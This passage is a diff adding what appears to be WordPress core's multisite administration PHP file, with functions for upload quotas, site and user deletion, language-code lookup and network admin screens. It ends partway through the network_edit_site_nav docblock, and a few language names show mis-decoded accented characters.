@@ -1,0 +1,2034 @@
+<?php
+/**
+ * Multisite administration functions.
+ *
+ * @package WordPress
+ * @subpackage Multisite
+ * @since 3.0.0
+ */
+
+/**
+ * Determine if uploaded file exceeds space quota.
+ *
+ * @since 3.0.0
+ *
+ * @param array $file $_FILES array for a given file.
+ * @return array $_FILES array with 'error' key set if file exceeds quota. 'error' is empty otherwise.
+ */
+function check_upload_size( $file ) {
+	if ( get_site_option( 'upload_space_check_disabled' ) ) {
+		return $file;
+	}
+
+	if ( '0' != $file['error'] ) { // There's already an error.
+		return $file;
+	}
+
+	if ( defined( 'WP_IMPORTING' ) ) {
+		return $file;
+	}
+
+	$space_left = get_upload_space_available();
+
+	$file_size = filesize( $file['tmp_name'] );
+	if ( $space_left < $file_size ) {
+		/* translators: %s: Required disk space in kilobytes. */
+		$file['error'] = sprintf( __( 'Not enough space to upload. %s KB needed.' ), number_format( ( $file_size - $space_left ) / KB_IN_BYTES ) );
+	}
+
+	if ( $file_size > ( KB_IN_BYTES * get_site_option( 'fileupload_maxk', 1500 ) ) ) {
+		/* translators: %s: Maximum allowed file size in kilobytes. */
+		$file['error'] = sprintf( __( 'This file is too big. Files must be less than %s KB in size.' ), get_site_option( 'fileupload_maxk', 1500 ) );
+	}
+
+	if ( upload_is_user_over_quota( false ) ) {
+		$file['error'] = __( 'You have used your space quota. Please delete files before uploading.' );
+	}
+
+	if ( '0' != $file['error'] && ! isset( $_POST['html-upload'] ) && ! wp_doing_ajax() ) {
+		wp_die( $file['error'] . ' <a href="javascript:history.go(-1)">' . __( 'Back' ) . '</a>' );
+	}
+
+	return $file;
+}
+
+/**
+ * Delete a site.
+ *
+ * @since 3.0.0
+ * @since 5.1.0 Use wp_delete_site() internally to delete the site row from the database.
+ *
+ * @global wpdb $wpdb WordPress database abstraction object.
+ *
+ * @param int  $blog_id Site ID.
+ * @param bool $drop    True if site's database tables should be dropped. Default false.
+ */
+function wpmu_delete_blog( $blog_id, $drop = false ) {
+	global $wpdb;
+
+	$switch = false;
+	if ( get_current_blog_id() != $blog_id ) {
+		$switch = true;
+		switch_to_blog( $blog_id );
+	}
+
+	$blog = get_site( $blog_id );
+
+	$current_network = get_network();
+
+	// If a full blog object is not available, do not destroy anything.
+	if ( $drop && ! $blog ) {
+		$drop = false;
+	}
+
+	// Don't destroy the initial, main, or root blog.
+	if ( $drop && ( 1 == $blog_id || is_main_site( $blog_id ) || ( $blog->path == $current_network->path && $blog->domain == $current_network->domain ) ) ) {
+		$drop = false;
+	}
+
+	$upload_path = trim( get_option( 'upload_path' ) );
+
+	// If ms_files_rewriting is enabled and upload_path is empty, wp_upload_dir is not reliable.
+	if ( $drop && get_site_option( 'ms_files_rewriting' ) && empty( $upload_path ) ) {
+		$drop = false;
+	}
+
+	if ( $drop ) {
+		wp_delete_site( $blog_id );
+	} else {
+		/** This action is documented in wp-includes/ms-blogs.php */
+		do_action_deprecated( 'delete_blog', array( $blog_id, false ), '5.1.0' );
+
+		$users = get_users(
+			array(
+				'blog_id' => $blog_id,
+				'fields'  => 'ids',
+			)
+		);
+
+		// Remove users from this blog.
+		if ( ! empty( $users ) ) {
+			foreach ( $users as $user_id ) {
+				remove_user_from_blog( $user_id, $blog_id );
+			}
+		}
+
+		update_blog_status( $blog_id, 'deleted', 1 );
+
+		/** This action is documented in wp-includes/ms-blogs.php */
+		do_action_deprecated( 'deleted_blog', array( $blog_id, false ), '5.1.0' );
+	}
+
+	if ( $switch ) {
+		restore_current_blog();
+	}
+}
+
+/**
+ * Delete a user from the network and remove from all sites.
+ *
+ * @since 3.0.0
+ *
+ * @todo Merge with wp_delete_user()?
+ *
+ * @global wpdb $wpdb WordPress database abstraction object.
+ *
+ * @param int $id The user ID.
+ * @return bool True if the user was deleted, otherwise false.
+ */
+function wpmu_delete_user( $id ) {
+	global $wpdb;
+
+	if ( ! is_numeric( $id ) ) {
+		return false;
+	}
+
+	$id   = (int) $id;
+	$user = new WP_User( $id );
+
+	if ( ! $user->exists() ) {
+		return false;
+	}
+
+	// Global super-administrators are protected, and cannot be deleted.
+	$_super_admins = get_super_admins();
+	if ( in_array( $user->user_login, $_super_admins, true ) ) {
+		return false;
+	}
+
+	/**
+	 * Fires before a user is deleted from the network.
+	 *
+	 * @since MU (3.0.0)
+	 * @since 5.5.0 Added the `$user` parameter.
+	 *
+	 * @param int     $id   ID of the user about to be deleted from the network.
+	 * @param WP_User $user WP_User object of the user about to be deleted from the network.
+	 */
+	do_action( 'wpmu_delete_user', $id, $user );
+
+	$blogs = get_blogs_of_user( $id );
+
+	if ( ! empty( $blogs ) ) {
+		foreach ( $blogs as $blog ) {
+			switch_to_blog( $blog->userblog_id );
+			remove_user_from_blog( $id, $blog->userblog_id );
+
+			$post_ids = $wpdb->get_col( $wpdb->prepare( "SELECT ID FROM $wpdb->posts WHERE post_author = %d", $id ) );
+			foreach ( (array) $post_ids as $post_id ) {
+				wp_delete_post( $post_id );
+			}
+
+			// Clean links.
+			$link_ids = $wpdb->get_col( $wpdb->prepare( "SELECT link_id FROM $wpdb->links WHERE link_owner = %d", $id ) );
+
+			if ( $link_ids ) {
+				foreach ( $link_ids as $link_id ) {
+					wp_delete_link( $link_id );
+				}
+			}
+
+			restore_current_blog();
+		}
+	}
+
+	$meta = $wpdb->get_col( $wpdb->prepare( "SELECT umeta_id FROM $wpdb->usermeta WHERE user_id = %d", $id ) );
+	foreach ( $meta as $mid ) {
+		delete_metadata_by_mid( 'user', $mid );
+	}
+
+	$wpdb->delete( $wpdb->users, array( 'ID' => $id ) );
+
+	clean_user_cache( $user );
+
+	/** This action is documented in wp-admin/includes/user.php */
+	do_action( 'deleted_user', $id, null, $user );
+
+	return true;
+}
+
+/**
+ * Check whether a site has used its allotted upload space.
+ *
+ * @since MU (3.0.0)
+ *
+ * @param bool $echo Optional. If $echo is set and the quota is exceeded, a warning message is echoed. Default is true.
+ * @return bool True if user is over upload space quota, otherwise false.
+ */
+function upload_is_user_over_quota( $echo = true ) {
+	if ( get_site_option( 'upload_space_check_disabled' ) ) {
+		return false;
+	}
+
+	$space_allowed = get_space_allowed();
+	if ( ! is_numeric( $space_allowed ) ) {
+		$space_allowed = 10; // Default space allowed is 10 MB.
+	}
+	$space_used = get_space_used();
+
+	if ( ( $space_allowed - $space_used ) < 0 ) {
+		if ( $echo ) {
+			printf(
+				/* translators: %s: Allowed space allocation. */
+				__( 'Sorry, you have used your space allocation of %s. Please delete some files to upload more files.' ),
+				size_format( $space_allowed * MB_IN_BYTES )
+			);
+		}
+		return true;
+	} else {
+		return false;
+	}
+}
+
+/**
+ * Displays the amount of disk space used by the current site. Not used in core.
+ *
+ * @since MU (3.0.0)
+ */
+function display_space_usage() {
+	$space_allowed = get_space_allowed();
+	$space_used    = get_space_used();
+
+	$percent_used = ( $space_used / $space_allowed ) * 100;
+
+	$space = size_format( $space_allowed * MB_IN_BYTES );
+	?>
+	<strong>
+	<?php
+		/* translators: Storage space that's been used. 1: Percentage of used space, 2: Total space allowed in megabytes or gigabytes. */
+		printf( __( 'Used: %1$s%% of %2$s' ), number_format( $percent_used ), $space );
+	?>
+	</strong>
+	<?php
+}
+
+/**
+ * Get the remaining upload space for this site.
+ *
+ * @since MU (3.0.0)
+ *
+ * @param int $size Current max size in bytes
+ * @return int Max size in bytes
+ */
+function fix_import_form_size( $size ) {
+	if ( upload_is_user_over_quota( false ) ) {
+		return 0;
+	}
+	$available = get_upload_space_available();
+	return min( $size, $available );
+}
+
+/**
+ * Displays the site upload space quota setting form on the Edit Site Settings screen.
+ *
+ * @since 3.0.0
+ *
+ * @param int $id The ID of the site to display the setting for.
+ */
+function upload_space_setting( $id ) {
+	switch_to_blog( $id );
+	$quota = get_option( 'blog_upload_space' );
+	restore_current_blog();
+
+	if ( ! $quota ) {
+		$quota = '';
+	}
+
+	?>
+	<tr>
+		<th><label for="blog-upload-space-number"><?php _e( 'Site Upload Space Quota' ); ?></label></th>
+		<td>
+			<input type="number" step="1" min="0" style="width: 100px" name="option[blog_upload_space]" id="blog-upload-space-number" aria-describedby="blog-upload-space-desc" value="<?php echo $quota; ?>" />
+			<span id="blog-upload-space-desc"><span class="screen-reader-text"><?php _e( 'Size in megabytes' ); ?></span> <?php _e( 'MB (Leave blank for network default)' ); ?></span>
+		</td>
+	</tr>
+	<?php
+}
+
+/**
+ * Cleans the user cache for a specific user.
+ *
+ * @since 3.0.0
+ *
+ * @param int $id The user ID.
+ * @return int|false The ID of the refreshed user or false if the user does not exist.
+ */
+function refresh_user_details( $id ) {
+	$id = (int) $id;
+
+	$user = get_userdata( $id );
+	if ( ! $user ) {
+		return false;
+	}
+
+	clean_user_cache( $user );
+
+	return $id;
+}
+
+/**
+ * Returns the language for a language code.
+ *
+ * @since 3.0.0
+ *
+ * @param string $code Optional. The two-letter language code. Default empty.
+ * @return string The language corresponding to $code if it exists. If it does not exist,
+ *                then the first two letters of $code is returned.
+ */
+function format_code_lang( $code = '' ) {
+	$code       = strtolower( substr( $code, 0, 2 ) );
+	$lang_codes = array(
+		'aa' => 'Afar',
+		'ab' => 'Abkhazian',
+		'af' => 'Afrikaans',
+		'ak' => 'Akan',
+		'sq' => 'Albanian',
+		'am' => 'Amharic',
+		'ar' => 'Arabic',
+		'an' => 'Aragonese',
+		'hy' => 'Armenian',
+		'as' => 'Assamese',
+		'av' => 'Avaric',
+		'ae' => 'Avestan',
+		'ay' => 'Aymara',
+		'az' => 'Azerbaijani',
+		'ba' => 'Bashkir',
+		'bm' => 'Bambara',
+		'eu' => 'Basque',
+		'be' => 'Belarusian',
+		'bn' => 'Bengali',
+		'bh' => 'Bihari',
+		'bi' => 'Bislama',
+		'bs' => 'Bosnian',
+		'br' => 'Breton',
+		'bg' => 'Bulgarian',
+		'my' => 'Burmese',
+		'ca' => 'Catalan; Valencian',
+		'ch' => 'Chamorro',
+		'ce' => 'Chechen',
+		'zh' => 'Chinese',
+		'cu' => 'Church Slavic; Old Slavonic; Church Slavonic; Old Bulgarian; Old Church Slavonic',
+		'cv' => 'Chuvash',
+		'kw' => 'Cornish',
+		'co' => 'Corsican',
+		'cr' => 'Cree',
+		'cs' => 'Czech',
+		'da' => 'Danish',
+		'dv' => 'Divehi; Dhivehi; Maldivian',
+		'nl' => 'Dutch; Flemish',
+		'dz' => 'Dzongkha',
+		'en' => 'English',
+		'eo' => 'Esperanto',
+		'et' => 'Estonian',
+		'ee' => 'Ewe',
+		'fo' => 'Faroese',
+		'fj' => 'Fijjian',
+		'fi' => 'Finnish',
+		'fr' => 'French',
+		'fy' => 'Western Frisian',
+		'ff' => 'Fulah',
+		'ka' => 'Georgian',
+		'de' => 'German',
+		'gd' => 'Gaelic; Scottish Gaelic',
+		'ga' => 'Irish',
+		'gl' => 'Galician',
+		'gv' => 'Manx',
+		'el' => 'Greek, Modern',
+		'gn' => 'Guarani',
+		'gu' => 'Gujarati',
+		'ht' => 'Haitian; Haitian Creole',
+		'ha' => 'Hausa',
+		'he' => 'Hebrew',
+		'hz' => 'Herero',
+		'hi' => 'Hindi',
+		'ho' => 'Hiri Motu',
+		'hu' => 'Hungarian',
+		'ig' => 'Igbo',
+		'is' => 'Icelandic',
+		'io' => 'Ido',
+		'ii' => 'Sichuan Yi',
+		'iu' => 'Inuktitut',
+		'ie' => 'Interlingue',
+		'ia' => 'Interlingua (International Auxiliary Language Association)',
+		'id' => 'Indonesian',
+		'ik' => 'Inupiaq',
+		'it' => 'Italian',
+		'jv' => 'Javanese',
+		'ja' => 'Japanese',
+		'kl' => 'Kalaallisut; Greenlandic',
+		'kn' => 'Kannada',
+		'ks' => 'Kashmiri',
+		'kr' => 'Kanuri',
+		'kk' => 'Kazakh',
+		'km' => 'Central Khmer',
+		'ki' => 'Kikuyu; Gikuyu',
+		'rw' => 'Kinyarwanda',
+		'ky' => 'Kirghiz; Kyrgyz',
+		'kv' => 'Komi',
+		'kg' => 'Kongo',
+		'ko' => 'Korean',
+		'kj' => 'Kuanyama; Kwanyama',
+		'ku' => 'Kurdish',
+		'lo' => 'Lao',
+		'la' => 'Latin',
+		'lv' => 'Latvian',
+		'li' => 'Limburgan; Limburger; Limburgish',
+		'ln' => 'Lingala',
+		'lt' => 'Lithuanian',
+		'lb' => 'Luxembourgish; Letzeburgesch',
+		'lu' => 'Luba-Katanga',
+		'lg' => 'Ganda',
+		'mk' => 'Macedonian',
+		'mh' => 'Marshallese',
+		'ml' => 'Malayalam',
+		'mi' => 'Maori',
+		'mr' => 'Marathi',
+		'ms' => 'Malay',
+		'mg' => 'Malagasy',
+		'mt' => 'Maltese',
+		'mo' => 'Moldavian',
+		'mn' => 'Mongolian',
+		'na' => 'Nauru',
+		'nv' => 'Navajo; Navaho',
+		'nr' => 'Ndebele, South; South Ndebele',
+		'nd' => 'Ndebele, North; North Ndebele',
+		'ng' => 'Ndonga',
+		'ne' => 'Nepali',
+		'nn' => 'Norwegian Nynorsk; Nynorsk, Norwegian',
+		'nb' => 'BokmГҐl, Norwegian, Norwegian BokmГҐl',
+		'no' => 'Norwegian',
+		'ny' => 'Chichewa; Chewa; Nyanja',
+		'oc' => 'Occitan, ProvenГ§al',
+		'oj' => 'Ojibwa',
+		'or' => 'Oriya',
+		'om' => 'Oromo',
+		'os' => 'Ossetian; Ossetic',
+		'pa' => 'Panjabi; Punjabi',
+		'fa' => 'Persian',
+		'pi' => 'Pali',
+		'pl' => 'Polish',
+		'pt' => 'Portuguese',
+		'ps' => 'Pushto',
+		'qu' => 'Quechua',
+		'rm' => 'Romansh',
+		'ro' => 'Romanian',
+		'rn' => 'Rundi',
+		'ru' => 'Russian',
+		'sg' => 'Sango',
+		'sa' => 'Sanskrit',
+		'sr' => 'Serbian',
+		'hr' => 'Croatian',
+		'si' => 'Sinhala; Sinhalese',
+		'sk' => 'Slovak',
+		'sl' => 'Slovenian',
+		'se' => 'Northern Sami',
+		'sm' => 'Samoan',
+		'sn' => 'Shona',
+		'sd' => 'Sindhi',
+		'so' => 'Somali',
+		'st' => 'Sotho, Southern',
+		'es' => 'Spanish; Castilian',
+		'sc' => 'Sardinian',
+		'ss' => 'Swati',
+		'su' => 'Sundanese',
+		'sw' => 'Swahili',
+		'sv' => 'Swedish',
+		'ty' => 'Tahitian',
+		'ta' => 'Tamil',
+		'tt' => 'Tatar',
+		'te' => 'Telugu',
+		'tg' => 'Tajik',
+		'tl' => 'Tagalog',
+		'th' => 'Thai',
+		'bo' => 'Tibetan',
+		'ti' => 'Tigrinya',
+		'to' => 'Tonga (Tonga Islands)',
+		'tn' => 'Tswana',
+		'ts' => 'Tsonga',
+		'tk' => 'Turkmen',
+		'tr' => 'Turkish',
+		'tw' => 'Twi',
+		'ug' => 'Uighur; Uyghur',
+		'uk' => 'Ukrainian',
+		'ur' => 'Urdu',
+		'uz' => 'Uzbek',
+		've' => 'Venda',
+		'vi' => 'Vietnamese',
+		'vo' => 'VolapГјk',
+		'cy' => 'Welsh',
+		'wa' => 'Walloon',
+		'wo' => 'Wolof',
+		'xh' => 'Xhosa',
+		'yi' => 'Yiddish',
+		'yo' => 'Yoruba',
+		'za' => 'Zhuang; Chuang',
+		'zu' => 'Zulu',
+	);
+
+	/**
+	 * Filters the language codes.
+	 *
+	 * @since MU (3.0.0)
+	 *
+	 * @param string[] $lang_codes Array of key/value pairs of language codes where key is the short version.
+	 * @param string   $code       A two-letter designation of the language.
+	 */
+	$lang_codes = apply_filters( 'lang_codes', $lang_codes, $code );
+	return strtr( $code, $lang_codes );
+}
+
+/**
+ * Synchronizes category and post tag slugs when global terms are enabled.
+ *
+ * @since 3.0.0
+ *
+ * @param WP_Term|array $term     The term.
+ * @param string        $taxonomy The taxonomy for `$term`. Should be 'category' or 'post_tag', as these are
+ *                                the only taxonomies which are processed by this function; anything else
+ *                                will be returned untouched.
+ * @return WP_Term|array Returns `$term`, after filtering the 'slug' field with `sanitize_title()`
+ *                       if `$taxonomy` is 'category' or 'post_tag'.
+ */
+function sync_category_tag_slugs( $term, $taxonomy ) {
+	if ( global_terms_enabled() && ( 'category' === $taxonomy || 'post_tag' === $taxonomy ) ) {
+		if ( is_object( $term ) ) {
+			$term->slug = sanitize_title( $term->name );
+		} else {
+			$term['slug'] = sanitize_title( $term['name'] );
+		}
+	}
+	return $term;
+}
+
+/**
+ * Displays an access denied message when a user tries to view a site's dashboard they
+ * do not have access to.
+ *
+ * @since 3.2.0
+ * @access private
+ */
+function _access_denied_splash() {
+	if ( ! is_user_logged_in() || is_network_admin() ) {
+		return;
+	}
+
+	$blogs = get_blogs_of_user( get_current_user_id() );
+
+	if ( wp_list_filter( $blogs, array( 'userblog_id' => get_current_blog_id() ) ) ) {
+		return;
+	}
+
+	$blog_name = get_bloginfo( 'name' );
+
+	if ( empty( $blogs ) ) {
+		wp_die(
+			sprintf(
+				/* translators: 1: Site title. */
+				__( 'You attempted to access the "%1$s" dashboard, but you do not currently have privileges on this site. If you believe you should be able to access the "%1$s" dashboard, please contact your network administrator.' ),
+				$blog_name
+			),
+			403
+		);
+	}
+
+	$output = '<p>' . sprintf(
+		/* translators: 1: Site title. */
+		__( 'You attempted to access the "%1$s" dashboard, but you do not currently have privileges on this site. If you believe you should be able to access the "%1$s" dashboard, please contact your network administrator.' ),
+		$blog_name
+	) . '</p>';
+	$output .= '<p>' . __( 'If you reached this screen by accident and meant to visit one of your own sites, here are some shortcuts to help you find your way.' ) . '</p>';
+
+	$output .= '<h3>' . __( 'Your Sites' ) . '</h3>';
+	$output .= '<table>';
+
+	foreach ( $blogs as $blog ) {
+		$output .= '<tr>';
+		$output .= "<td>{$blog->blogname}</td>";
+		$output .= '<td><a href="' . esc_url( get_admin_url( $blog->userblog_id ) ) . '">' . __( 'Visit Dashboard' ) . '</a> | ' .
+			'<a href="' . esc_url( get_home_url( $blog->userblog_id ) ) . '">' . __( 'View Site' ) . '</a></td>';
+		$output .= '</tr>';
+	}
+
+	$output .= '</table>';
+
+	wp_die( $output, 403 );
+}
+
+/**
+ * Checks if the current user has permissions to import new users.
+ *
+ * @since 3.0.0
+ *
+ * @param string $permission A permission to be checked. Currently not used.
+ * @return bool True if the user has proper permissions, false if they do not.
+ */
+function check_import_new_users( $permission ) {
+	if ( ! current_user_can( 'manage_network_users' ) ) {
+		return false;
+	}
+
+	return true;
+}
+// See "import_allow_fetch_attachments" and "import_attachment_size_limit" filters too.
+
+/**
+ * Generates and displays a drop-down of available languages.
+ *
+ * @since 3.0.0
+ *
+ * @param string[] $lang_files Optional. An array of the language files. Default empty array.
+ * @param string   $current    Optional. The current language code. Default empty.
+ */
+function mu_dropdown_languages( $lang_files = array(), $current = '' ) {
+	$flag   = false;
+	$output = array();
+
+	foreach ( (array) $lang_files as $val ) {
+		$code_lang = basename( $val, '.mo' );
+
+		if ( 'en_US' === $code_lang ) { // American English.
+			$flag          = true;
+			$ae            = __( 'American English' );
+			$output[ $ae ] = '<option value="' . esc_attr( $code_lang ) . '"' . selected( $current, $code_lang, false ) . '> ' . $ae . '</option>';
+		} elseif ( 'en_GB' === $code_lang ) { // British English.
+			$flag          = true;
+			$be            = __( 'British English' );
+			$output[ $be ] = '<option value="' . esc_attr( $code_lang ) . '"' . selected( $current, $code_lang, false ) . '> ' . $be . '</option>';
+		} else {
+			$translated            = format_code_lang( $code_lang );
+			$output[ $translated ] = '<option value="' . esc_attr( $code_lang ) . '"' . selected( $current, $code_lang, false ) . '> ' . esc_html( $translated ) . '</option>';
+		}
+	}
+
+	if ( false === $flag ) { // WordPress English.
+		$output[] = '<option value=""' . selected( $current, '', false ) . '>' . __( 'English' ) . '</option>';
+	}
+
+	// Order by name.
+	uksort( $output, 'strnatcasecmp' );
+
+	/**
+	 * Filters the languages available in the dropdown.
+	 *
+	 * @since MU (3.0.0)
+	 *
+	 * @param string[] $output     Array of HTML output for the dropdown.
+	 * @param string[] $lang_files Array of available language files.
+	 * @param string   $current    The current language code.
+	 */
+	$output = apply_filters( 'mu_dropdown_languages', $output, $lang_files, $current );
+
+	echo implode( "\n\t", $output );
+}
+
+/**
+ * Displays an admin notice to upgrade all sites after a core upgrade.
+ *
+ * @since 3.0.0
+ *
+ * @global int    $wp_db_version WordPress database version.
+ * @global string $pagenow
+ *
+ * @return void|false Void on success. False if the current user is not a super admin.
+ */
+function site_admin_notice() {
+	global $wp_db_version, $pagenow;
+
+	if ( ! current_user_can( 'upgrade_network' ) ) {
+		return false;
+	}
+
+	if ( 'upgrade.php' === $pagenow ) {
+		return;
+	}
+
+	if ( get_site_option( 'wpmu_upgrade_site' ) != $wp_db_version ) {
+		echo "<div class='update-nag notice notice-warning inline'>" . sprintf(
+			/* translators: %s: URL to Upgrade Network screen. */
+			__( 'Thank you for Updating! Please visit the <a href="%s">Upgrade Network</a> page to update all your sites.' ),
+			esc_url( network_admin_url( 'upgrade.php' ) )
+		) . '</div>';
+	}
+}
+
+/**
+ * Avoids a collision between a site slug and a permalink slug.
+ *
+ * In a subdirectory installation this will make sure that a site and a post do not use the
+ * same subdirectory by checking for a site with the same name as a new post.
+ *
+ * @since 3.0.0
+ *
+ * @param array $data    An array of post data.
+ * @param array $postarr An array of posts. Not currently used.
+ * @return array The new array of post data after checking for collisions.
+ */
+function avoid_blog_page_permalink_collision( $data, $postarr ) {
+	if ( is_subdomain_install() ) {
+		return $data;
+	}
+	if ( 'page' !== $data['post_type'] ) {
+		return $data;
+	}
+	if ( ! isset( $data['post_name'] ) || '' === $data['post_name'] ) {
+		return $data;
+	}
+	if ( ! is_main_site() ) {
+		return $data;
+	}
+
+	$post_name = $data['post_name'];
+	$c         = 0;
+	while ( $c < 10 && get_id_from_blogname( $post_name ) ) {
+		$post_name .= mt_rand( 1, 10 );
+		$c ++;
+	}
+	if ( $post_name != $data['post_name'] ) {
+		$data['post_name'] = $post_name;
+	}
+	return $data;
+}
+
+/**
+ * Handles the display of choosing a user's primary site.
+ *
+ * This displays the user's primary site and allows the user to choose
+ * which site is primary.
+ *
+ * @since 3.0.0
+ */
+function choose_primary_blog() {
+	?>
+	<table class="form-table" role="presentation">
+	<tr>
+	<?php /* translators: My Sites label. */ ?>
+		<th scope="row"><label for="primary_blog"><?php _e( 'Primary Site' ); ?></label></th>
+		<td>
+		<?php
+		$all_blogs    = get_blogs_of_user( get_current_user_id() );
+		$primary_blog = get_user_meta( get_current_user_id(), 'primary_blog', true );
+		if ( count( $all_blogs ) > 1 ) {
+			$found = false;
+			?>
+			<select name="primary_blog" id="primary_blog">
+				<?php
+				foreach ( (array) $all_blogs as $blog ) {
+					if ( $primary_blog == $blog->userblog_id ) {
+						$found = true;
+					}
+					?>
+					<option value="<?php echo $blog->userblog_id; ?>"<?php selected( $primary_blog, $blog->userblog_id ); ?>><?php echo esc_url( get_home_url( $blog->userblog_id ) ); ?></option>
+					<?php
+				}
+				?>
+			</select>
+			<?php
+			if ( ! $found ) {
+				$blog = reset( $all_blogs );
+				update_user_meta( get_current_user_id(), 'primary_blog', $blog->userblog_id );
+			}
+		} elseif ( count( $all_blogs ) == 1 ) {
+			$blog = reset( $all_blogs );
+			echo esc_url( get_home_url( $blog->userblog_id ) );
+			if ( $primary_blog != $blog->userblog_id ) { // Set the primary blog again if it's out of sync with blog list.
+				update_user_meta( get_current_user_id(), 'primary_blog', $blog->userblog_id );
+			}
+		} else {
+			echo 'N/A';
+		}
+		?>
+		</td>
+	</tr>
+	</table>
+	<?php
+}
+
+/**
+ * Whether or not we can edit this network from this page.
+ *
+ * By default editing of network is restricted to the Network Admin for that `$network_id`.
+ * This function allows for this to be overridden.
+ *
+ * @since 3.1.0
+ *
+ * @param int $network_id The network ID to check.
+ * @return bool True if network can be edited, otherwise false.
+ */
+function can_edit_network( $network_id ) {
+	if ( get_current_network_id() == $network_id ) {
+		$result = true;
+	} else {
+		$result = false;
+	}
+
+	/**
+	 * Filters whether this network can be edited from this page.
+	 *
+	 * @since 3.1.0
+	 *
+	 * @param bool $result     Whether the network can be edited from this page.
+	 * @param int  $network_id The network ID to check.
+	 */
+	return apply_filters( 'can_edit_network', $result, $network_id );
+}
+
+/**
+ * Thickbox image paths for Network Admin.
+ *
+ * @since 3.1.0
+ *
+ * @access private
+ */
+function _thickbox_path_admin_subfolder() {
+	?>
+<script type="text/javascript">
+var tb_pathToImage = "<?php echo esc_js( includes_url( 'js/thickbox/loadingAnimation.gif', 'relative' ) ); ?>";
+</script>
+	<?php
+}
+
+/**
+ * @param array $users
+ */
+function confirm_delete_users( $users ) {
+	$current_user = wp_get_current_user();
+	if ( ! is_array( $users ) || empty( $users ) ) {
+		return false;
+	}
+	?>
+	<h1><?php esc_html_e( 'Users' ); ?></h1>
+
+	<?php if ( 1 === count( $users ) ) : ?>
+		<p><?php _e( 'You have chosen to delete the user from all networks and sites.' ); ?></p>
+	<?php else : ?>
+		<p><?php _e( 'You have chosen to delete the following users from all networks and sites.' ); ?></p>
+	<?php endif; ?>
+
+	<form action="users.php?action=dodelete" method="post">
+	<input type="hidden" name="dodelete" />
+	<?php
+	wp_nonce_field( 'ms-users-delete' );
+	$site_admins = get_super_admins();
+	$admin_out   = '<option value="' . esc_attr( $current_user->ID ) . '">' . $current_user->user_login . '</option>';
+	?>
+	<table class="form-table" role="presentation">
+	<?php
+	$allusers = (array) $_POST['allusers'];
+	foreach ( $allusers as $user_id ) {
+		if ( '' !== $user_id && '0' != $user_id ) {
+			$delete_user = get_userdata( $user_id );
+
+			if ( ! current_user_can( 'delete_user', $delete_user->ID ) ) {
+				wp_die(
+					sprintf(
+						/* translators: %s: User login. */
+						__( 'Warning! User %s cannot be deleted.' ),
+						$delete_user->user_login
+					)
+				);
+			}
+
+			if ( in_array( $delete_user->user_login, $site_admins, true ) ) {
+				wp_die(
+					sprintf(
+						/* translators: %s: User login. */
+						__( 'Warning! User cannot be deleted. The user %s is a network administrator.' ),
+						'<em>' . $delete_user->user_login . '</em>'
+					)
+				);
+			}
+			?>
+			<tr>
+				<th scope="row"><?php echo $delete_user->user_login; ?>
+					<?php echo '<input type="hidden" name="user[]" value="' . esc_attr( $user_id ) . '" />' . "\n"; ?>
+				</th>
+			<?php
+			$blogs = get_blogs_of_user( $user_id, true );
+
+			if ( ! empty( $blogs ) ) {
+				?>
+				<td><fieldset><p><legend>
+				<?php
+				printf(
+					/* translators: %s: User login. */
+					__( 'What should be done with content owned by %s?' ),
+					'<em>' . $delete_user->user_login . '</em>'
+				);
+				?>
+				</legend></p>
+				<?php
+				foreach ( (array) $blogs as $key => $details ) {
+					$blog_users = get_users(
+						array(
+							'blog_id' => $details->userblog_id,
+							'fields'  => array( 'ID', 'user_login' ),
+						)
+					);
+
+					if ( is_array( $blog_users ) && ! empty( $blog_users ) ) {
+						$user_site      = "<a href='" . esc_url( get_home_url( $details->userblog_id ) ) . "'>{$details->blogname}</a>";
+						$user_dropdown  = '<label for="reassign_user" class="screen-reader-text">' . __( 'Select a user' ) . '</label>';
+						$user_dropdown .= "<select name='blog[$user_id][$key]' id='reassign_user'>";
+						$user_list      = '';
+
+						foreach ( $blog_users as $user ) {
+							if ( ! in_array( (int) $user->ID, $allusers, true ) ) {
+								$user_list .= "<option value='{$user->ID}'>{$user->user_login}</option>";
+							}
+						}
+
+						if ( '' === $user_list ) {
+							$user_list = $admin_out;
+						}
+
+						$user_dropdown .= $user_list;
+						$user_dropdown .= "</select>\n";
+						?>
+						<ul style="list-style:none;">
+							<li>
+								<?php
+								/* translators: %s: Link to user's site. */
+								printf( __( 'Site: %s' ), $user_site );
+								?>
+							</li>
+							<li><label><input type="radio" id="delete_option0" name="delete[<?php echo $details->userblog_id . '][' . $delete_user->ID; ?>]" value="delete" checked="checked" />
+							<?php _e( 'Delete all content.' ); ?></label></li>
+							<li><label><input type="radio" id="delete_option1" name="delete[<?php echo $details->userblog_id . '][' . $delete_user->ID; ?>]" value="reassign" />
+							<?php _e( 'Attribute all content to:' ); ?></label>
+							<?php echo $user_dropdown; ?></li>
+						</ul>
+						<?php
+					}
+				}
+				echo '</fieldset></td></tr>';
+			} else {
+				?>
+				<td><p><?php _e( 'User has no sites or content and will be deleted.' ); ?></p></td>
+			<?php } ?>
+			</tr>
+			<?php
+		}
+	}
+
+	?>
+	</table>
+	<?php
+	/** This action is documented in wp-admin/users.php */
+	do_action( 'delete_user_form', $current_user, $allusers );
+
+	if ( 1 === count( $users ) ) :
+		?>
+		<p><?php _e( 'Once you hit &#8220;Confirm Deletion&#8221;, the user will be permanently removed.' ); ?></p>
+	<?php else : ?>
+		<p><?php _e( 'Once you hit &#8220;Confirm Deletion&#8221;, these users will be permanently removed.' ); ?></p>
+		<?php
+	endif;
+
+	submit_button( __( 'Confirm Deletion' ), 'primary' );
+	?>
+	</form>
+	<?php
+	return true;
+}
+
+/**
+ * Print JavaScript in the header on the Network Settings screen.
+ *
+ * @since 4.1.0
+ */
+function network_settings_add_js() {
+	?>
+<script type="text/javascript">
+jQuery(document).ready( function($) {
+	var languageSelect = $( '#WPLANG' );
+	$( 'form' ).on( 'submit', function() {
+		// Don't show a spinner for English and installed languages,
+		// as there is nothing to download.
+		if ( ! languageSelect.find( 'option:selected' ).data( 'installed' ) ) {
+			$( '#submit', this ).after( '<span class="spinner language-install-spinner is-active" />' );
+		}
+	});
+});
+</script>
+	<?php
+}
+
+/**
+ * Outputs the HTML for a network's "Edit Site" tabular interface.
+ *
+ * @since 4.6.0
+ *
+ * @global string $pagenow
+ *
+ * @param array $args {
+ *     Optional. Array or string of Query parameters. Default empty array.
+ *
+ *     @type int    $blog_id  The site ID. Default is the current site.
+ *     @type array  $links    The tabs to include with (label|url|cap) keys.
+ *     @type string $selected The ID of the selected link.
+ * }
+ */
+function network_edit_site_nav( $args = array() ) {
+
+	/**
+	 * Filters the links that appear on site-editing network pages.
